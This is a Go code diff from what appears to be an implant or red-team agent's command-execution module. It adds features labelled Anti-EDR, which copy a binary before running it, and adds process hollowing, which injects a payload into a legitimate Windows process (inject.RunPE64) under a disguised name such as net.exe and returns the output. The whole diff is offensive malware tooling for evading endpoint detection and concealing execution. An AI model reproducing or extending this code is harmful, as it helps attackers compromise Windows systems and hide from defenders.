@@ -81,10 +81,10 @@ func ExecOutputDecode(data []byte) string {
 	}
 }
 
-func hollow(source, replace, name string, args []string) {
+func hollow(source, replace, name string, args []string) (int, []byte, []byte, error) {
 	log.Infof("Replacing %s with %s\n", source, replace)
 	data, _ := ioutil.ReadFile(replace)
-	inject.RunPE64(data, source, name, strings.Join(args, " "))
+	return inject.RunPE64(data, source, name, strings.Join(args, " "))
 }
 
 func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pid int, exitCode int, err error) {
@@ -135,13 +135,15 @@ func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pi
 		return stdOut, stdErr, pid, exitCode, fmt.Errorf("shelltype %s unkown a", shellType)
 	}
 
-	/* copyFirst Anti-EDR */
+	/* Anti-EDR: copyFirst */
 	copyFirst, ok := packetArgument["copyFirst"]
 	if ok {
 		err = CopyFile(executable, copyFirst)
 		if err != nil {
 			return stdOut, stdErr, pid, exitCode, fmt.Errorf("error copying file: %s", err.Error())
 		}
+		// Destination is the new binary we execute
+		executable = copyFirst
 	}
 
 	cmd := exec.CommandContext(ctx, executable, args...)
@@ -167,31 +169,34 @@ func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pi
 
 	// Inject?
 
-	// Hollow?
-	_, ok = packetArgument["hollow"]
+	// See how we want to execute it
+	source, ok := packetArgument["hollow"]
 	if ok {
-		source := "c:\\windows\\system32\\hostname.exe"
-		name := "net.exe"
-
-		//replace := "c:\\windows\\system32\\calc.exe"
-		hollow(source, executable, name, args)
-	}
-
-	stdOut, err = cmd.Output()
-	if err != nil {
-		if exitError, ok := err.(*exec.ExitError); ok {
-			stdErr = exitError.Stderr
-			pid = exitError.Pid()
-			exitCode = exitError.ProcessState.ExitCode()
-		} else {
-			pid = 0
-			exitCode = cmd.ProcessState.ExitCode()
-
+		// Perform Process Hollowing
+		name := "net.exe" // TODO
+		pid, stdOut, stdErr, err = hollow(source, executable, name, args)
+		if err != nil {
+			log.Errorf("Error: %s", err.Error())
 		}
 	} else {
-		pid = cmd.ProcessState.Pid()
-		exitCode = cmd.ProcessState.ExitCode()
+		// Execute the (possibly copied) binary directly
+		stdOut, err = cmd.Output()
+		if err != nil {
+			if exitError, ok := err.(*exec.ExitError); ok {
+				stdErr = exitError.Stderr
+				pid = exitError.Pid()
+				exitCode = exitError.ProcessState.ExitCode()
+			} else {
+				pid = 0
+				exitCode = cmd.ProcessState.ExitCode()
+
+			}
+		} else {
+			pid = cmd.ProcessState.Pid()
+			exitCode = cmd.ProcessState.ExitCode()
+		}
 	}
+
 	return stdOut, stdErr, pid, exitCode, err
 }
 
